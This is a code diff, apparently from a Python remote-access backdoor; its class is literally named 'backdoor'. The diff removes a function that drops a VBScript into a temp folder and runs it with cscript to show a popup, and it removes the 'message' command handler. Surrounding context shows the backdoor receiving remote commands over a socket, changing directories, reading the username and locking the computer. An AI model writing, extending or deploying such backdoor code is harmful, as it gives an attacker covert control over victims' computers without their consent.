@@ -6,9 +6,7 @@
 import socket
 import os
 import time
-import subprocess
 import ctypes
-from io import open
 
 class backdoor:
 	try:
@@ -69,21 +67,6 @@ class backdoor:
 		except Exception as err:
 			return "[-] Couldn't get the username: " + str(err)
 
-	# show message box popup
-	def show_message_box(self, message):
-		try:
-			str_script = os.path.join(self.TMP, "m.vbs")
-			with open(str_script, "w") as objVBS:
-				objVBS.write('Msgbox "' + message + '", vbOKOnly+vbInformation+vbSystemModal, "Message"'.decode('utf-8'))
-            		
-			command = "cscript " + self.TMP + "/m.vbs "
-			
-			subprocess.Popen(command , stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
-
-			return "[+] Message sent: " + str(message)
-		except Exception as err:
-			return "[-] Couldn't send the message: " + str(err)
-
 	# lock computer
 	def lock_computer(self):
 		try:
@@ -117,11 +100,6 @@ class backdoor:
 			# change directory
 			elif cmd_0 == "cd":
 				ret = self.change_working_directory(cmd_rest)
-				self.con.send(ret + "\r\n")
-
-			# message box
-			elif cmd_0 == "message":
-				ret = self.show_message_box(cmd_rest)
 				self.con.send(ret + "\r\n")
 
 			# lock computer
